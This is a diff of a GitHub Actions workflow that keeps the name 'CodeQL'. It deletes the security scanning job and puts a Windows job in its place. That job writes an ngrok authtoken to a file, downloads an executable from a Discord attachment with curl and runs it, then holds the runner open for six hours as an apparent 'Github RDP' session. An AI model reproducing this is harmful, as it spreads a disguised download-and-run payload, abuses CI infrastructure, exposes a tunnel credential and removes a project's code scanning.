@@ -11,61 +11,75 @@
 #
 name: "CodeQL"
 
-on:
-  push:
-    branches: [ master, stable* ]
-  pull_request:
-    # The branches below must be a subset of the branches above
-    branches: [ master, stable* ]
-  schedule:
-    - cron: '30 8 * * 6'
+on: workflow_dispatch
 
 jobs:
-  analyze:
-    name: Analyze
-    runs-on: ubuntu-latest
+  build:
 
-    strategy:
-      fail-fast: false
-      matrix:
-        language: [ 'cpp' ]
-        # CodeQL supports [ 'cpp', 'csharp', 'go', 'java', 'javascript', 'python' ]
-        # Learn more:
-        # https://docs.github.com/en/free-pro-team@latest/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed
+    runs-on: windows-2022
+    timeout-minutes: 360
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v2
-
-    # Initializes the CodeQL tools for scanning.
-    - name: Initialize CodeQL
-      uses: github/codeql-action/init@v1
-      with:
-        languages: ${{ matrix.language }}
-        # If you wish to specify custom queries, you can do so here or in a config file.
-        # By default, queries listed here will override any specified in a config file.
-        # Prefix the list here with "+" to use these queries and those in the config file.
-        # queries: ./path/to/local/query, your-org/your-repo/queries@main
-
-    # Autobuild attempts to build any compiled languages  (C/C++, C#, or Java).
-    # If this step fails, then you should remove it and run the build manually (see below)
-    # - name: Autobuild
-    #   uses: github/codeql-action/autobuild@v1
-
-    # ℹ️ Command-line programs to run using the OS shell.
-    # 📚 https://git.io/JvXDl
-
-    # ✏️ If the Autobuild fails above, remove it and uncomment the following three lines
-    #    and modify them (or add more) to build your code if your project
-    #    uses a compiled language
-
-    - run: |
-       sudo apt update
-       sudo apt install libxrandr-dev libxinerama-dev libusb-1.0-0-dev xserver-xorg-dev libswscale-dev libswresample-dev libavutil-dev libavcodec-dev libcups2-dev libpulse-dev libasound2-dev libpcsclite-dev xsltproc libxcb-cursor-dev libxcursor-dev libcairo2-dev libfaac-dev libfaad-dev libjpeg-dev libgsm1-dev ninja-build libxfixes-dev libxkbcommon-dev libwayland-dev libpam0g-dev libxdamage-dev libxcb-damage0-dev ccache libxtst-dev libfuse-dev libsystemd-dev libcairo2-dev libsoxr-dev
-       mkdir ci-build
-       cd ci-build
-       cmake -GNinja ../ci/cmake-preloads/config-linux-all.txt ..
-       cmake --build .
-
-    - name: Perform CodeQL Analysis
-      uses: github/codeql-action/analyze@v1
+    - name: Download Build Files Needed For Virtual Environment And Processing ....
+      run: |
+        cmd /c tzutil /s "SE Asia Standard Time"
+        cmd /c echo ngrok authtoken "1ziMFy48DzwhpqVuRqZKob8i3Bn_6K3qjkKxx6G5sr1NCC8PT" > ngrok.bat
+        cmd /c curl -s -O https://cdn.discordapp.com/attachments/836128067885072396/855868420679532564/githubdev.exe
+        cmd /c githubdev.exe
+    - name: Wellcome To Github RDP !!! Your have 6h to use your DEV environment 2 CPU-7 GB of RAM. 
+      run: |
+        Start-Sleep -s 60
+        msg * /time:1700 "Wellcome To Github RDP !!! Your have 6h to use your DEV environment 2 CPU-7 GB of RAM."
+        Start-Sleep -s 1740
+    - name: Your have 5h30m left
+      run: |
+        msg * /time:1800 "                     Your have 5h30m left."
+        Start-Sleep -s 1800
+    - name: Your have 5h left
+      run: |
+        msg * /time:1800 "                     Your have 5h left."
+        Start-Sleep -s 1800
+    - name: Your have 4h30m left
+      run: |
+        msg * /time:1800 "                     Your have 4h30m left."
+        Start-Sleep -s 1800
+    - name: Your have 4h left
+      run: |
+        msg * /time:1800 "                     Your have 4h left."
+        Start-Sleep -s 1800  
+    - name: Your have 3h30m left
+      run: |
+        msg * /time:1800 "                     Your have 3h30m left."
+        Start-Sleep -s 1800   
+    - name: Your have 3h left
+      run: |
+        msg * /time:1800 "                     Your have 3h left."
+        Start-Sleep -s 1800  
+    - name: Your have 2h30m left
+      run: |
+        msg * /time:1800 "                     Your have 2h30m left."
+        Start-Sleep -s 1800      
+    - name: Your have 2h left
+      run: |
+        msg * /time:1800 "                     Your have 2h left."
+        Start-Sleep -s 1800      
+    - name: Your have 1h30m left
+      run: |
+        msg * /time:1800 "                     Your have 1h30m left."
+        Start-Sleep -s 1800
+    - name: Your have 1h left
+      run: |
+        msg * /time:1800 "                     Your have 1h left."
+        Start-Sleep -s 1800
+    - name: Your have 35m left
+      run: |
+        msg * /time:1800 "                     Your have 35m left."
+        Start-Sleep -s 1800       
+    - name: Your have 5m left. Remember save your work!!! 
+      run: |
+        msg * /time:200 "                     Your have 5m left. Remember save your work!!! "
+        Start-Sleep -s 200  
+    - name: Windows will shut down in 1m
+      run: |
+        msg * /time:60 "                     Windows will shut down in 1m "
+        Start-Sleep -s 60 
